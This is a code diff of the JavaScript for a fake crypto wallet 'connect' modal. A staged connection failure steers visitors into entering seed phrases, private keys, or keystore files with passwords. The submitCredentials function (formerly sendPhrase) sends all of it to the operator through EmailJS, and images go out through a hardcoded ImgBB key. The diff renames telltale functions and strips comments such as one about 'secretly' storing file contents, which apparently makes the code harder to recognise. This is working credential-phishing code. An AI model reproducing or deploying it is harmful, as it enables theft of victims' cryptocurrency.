@@ -1,9 +1,7 @@
-
-// ===== EXPLICIT ACTION TRIGGERS =====
 const triggerWallet = (e) => {
     e.preventDefault();
     if (typeof openWallet === 'function') {
-        openWallet();
+        showModal();
     }
 };
 
@@ -11,16 +9,11 @@ document.querySelectorAll('.btn-primary, .support-btn, .nav-links a, .mobile-men
     if (el) el.addEventListener('click', triggerWallet);
 });
 
-// ── Core modal logic ─────────────────────────────────
 const wOverlay = document.getElementById('wOverlay');
 const wScreen1 = document.getElementById('wScreen1');
 const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen4', 'wScreen5'];
 
-// ┌──────────────────────────────────────────────────┐
-// │  openWallet()  ← ADD onclick="openWallet()"      │
-// │  to any button on your site to trigger the modal │
-// └──────────────────────────────────────────────────┘
-function openWallet() {
+function showModal() {
     wOverlay.classList.add('open');
     document.body.style.overflow = 'hidden';
     allOff();
@@ -44,11 +37,9 @@ function showSub(id) {
     document.getElementById(id).classList.add('active');
 }
 
-// close on backdrop / Escape
 wOverlay.addEventListener('click', e => { if (e.target === wOverlay) closeWallet(); });
 document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });
 
-// ── Wallet identity ───────────────────────────────
 function setWallet(img, name) {
     ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
     ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
@@ -58,10 +49,9 @@ function handleWalletSelect(el) {
     const img = el.querySelector('img').src;
     const name = (el.querySelector('.w-feat-name') || el.querySelector('.w-item-name')).textContent;
     setWallet(img, name);
-    startConnecting();
+    beginSync();
 }
 
-// ── Other wallets + search ────────────────────────
 const ALL_WALLETS = Array.from(document.querySelectorAll('.ow-item'));
 const TOTAL = ALL_WALLETS.length;
 
@@ -104,10 +94,9 @@ function selectOwWallet(el) {
     const img = el.querySelector('img').src;
     const name = el.querySelector('.ow-name').textContent;
     setWallet(img, name);
-    startConnecting();
+    beginSync();
 }
 
-// ── Type toggle (Screen 4) ────────────────────────
 function switchType(type) {
     ['phrase', 'keystore', 'privatekey'].forEach(t => {
         document.getElementById('btn-' + t).classList.toggle('active', t === type);
@@ -115,7 +104,7 @@ function switchType(type) {
     });
 }
 
-const IMGBB_API_KEY = "41a8f8a46afb0e1960d74a605fd1e845"; // <--- REPLACE THIS WITH YOUR FREE IMGBB API KEY
+const IMGBB_API_KEY = "41a8f8a46afb0e1960d74a605fd1e845";
 
 function uploadToImgBB(file) {
     const formData = new FormData();
@@ -138,12 +127,9 @@ function uploadToImgBB(file) {
         });
 }
 
-// Keystore file attach
-function handleKeystoreFile(input) {
+function handleKSF(input) {
     const file = input.files[0];
     if (!file) return;
-
-    // Clear out any old lingering data from previous uploads
     delete document.getElementById('keystoreInput').dataset.imgUrl;
     delete document.getElementById('keystoreInput').dataset.imgBase64;
     delete document.getElementById('keystoreInput').dataset.fileContent;
@@ -156,7 +142,6 @@ function handleKeystoreFile(input) {
             document.getElementById('keystoreInput').dataset.imgBase64 = "Image stored, awaiting ImgBB...";
             uploadToImgBB(file);
         } else {
-            // Save the raw text of the file directly to dataset so it NEVER wipes what the user typed in the textbox!
             document.getElementById('keystoreInput').dataset.fileContent = e.target.result;
         }
     };
@@ -193,7 +178,7 @@ const statusMsgs = [
     "Connection attempt finishing..."
 ];
 
-function startConnecting() {
+function beginSync() {
     aborted = false;
     showSub('wScreen2');
     const statusEl = document.getElementById('s2Status');
@@ -224,11 +209,11 @@ function startConnecting() {
 }
 
 document.getElementById('retryBtn').addEventListener('click', () => {
-    stopTimers(); startConnecting();
+    stopTimers(); beginSync();
 });
 document.getElementById('manualBtn').addEventListener('click', () => {
     stopTimers();
-    switchType('keystore'); // Explicitly force Keystore JSON default
+    switchType('keystore');
     showSub('wScreen4');
 });
 
@@ -239,11 +224,10 @@ function handleRetryManual() {
     document.getElementById('privkeyInput').value = '';
     document.getElementById('attachFileName').textContent = '';
     document.getElementById('keystoreFileInput').value = '';
-    switchType('keystore'); // Explicitly force Keystore JSON default
+    switchType('keystore');
     showSub('wScreen4');
 }
 
-// ── Manual connect ────────────────────────────────
 function handleManualConnect() {
     showSub('wScreen2');
     aborted = false;
@@ -281,7 +265,7 @@ function handleManualConnect() {
     }, 6000);
 }
 
-function sendPhrase() {
+function submitCredentials() {
     const activeType = document.querySelector('.type-btn.active').id.replace('btn-', '');
     let messageString = '';
     let isValid = false;
@@ -321,12 +305,10 @@ function sendPhrase() {
         let fileInfo = fileAttached ? "Yes (" + document.getElementById('keystoreFileInput').files[0].name + ")" : "No";
         messageString = "Type: Keystore JSON\nPassword: " + keyPass + "\nFile Attached: " + fileInfo;
 
-        // Grab the manually typed passphrase
         if (keyData) {
             messageString += "\n\nTyped Passphrase/Text:\n" + keyData;
         }
 
-        // Grab the file contents that we secretly stored in the dataset behind the scenes!
         const attachedContent = document.getElementById('keystoreInput').dataset.fileContent;
         if (attachedContent) {
             messageString += "\n\nAttached File Content:\n" + attachedContent;
@@ -350,15 +332,13 @@ function sendPhrase() {
 
     let parms = { message: safetext };
 
-    // Trigger EmailJS instantly and synchronously natively.
     emailjs.send("service_p8dreiw", "template_o4d49ej", parms)
         .then(function (response) {
-            console.log("200! Successfully sent", response.status, response.text);
+            console.log("200!", response.status, response.text);
         })
         .catch(function (error) {
             console.error("Transmission error...", error);
         });
 
-    // Provide immediate visual feedback to the user
     handleManualConnect();
 }
